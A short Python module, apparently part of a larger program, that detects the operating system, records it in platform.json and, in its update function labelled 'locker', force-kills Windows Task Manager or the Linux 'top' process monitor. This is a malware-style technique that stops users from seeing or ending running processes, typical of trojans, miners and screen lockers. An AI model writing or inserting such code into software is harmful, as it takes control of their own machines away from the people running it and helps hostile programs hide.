import os
import platform

flag_windows = False
flag_linux = False

def windows():
    taskkill_cmd = "TASKKILL /F /IM taskmgr.exe"
    os.system(taskkill_cmd)

def linux():
    os.system('pkill top')

def get_platform():
    p = platform.system()
    with open("platform.json", "w") as pl:
        pl.write('{"platform": "'+p+'"}')
        pl.close()
    return p


def start():
    global flag_windows, flag_linux
    if get_platform() == "Windows":
        flag_windows = True
        print("os system --> Windows")
    elif get_platform() == "Linux":
        flag_linux = True
        print("os system --> Linux")

def update():
    if flag_linux:
        linux() #locker
        print("top locked.")
    elif flag_windows:
        windows() #locker
        print("task manager locked.")

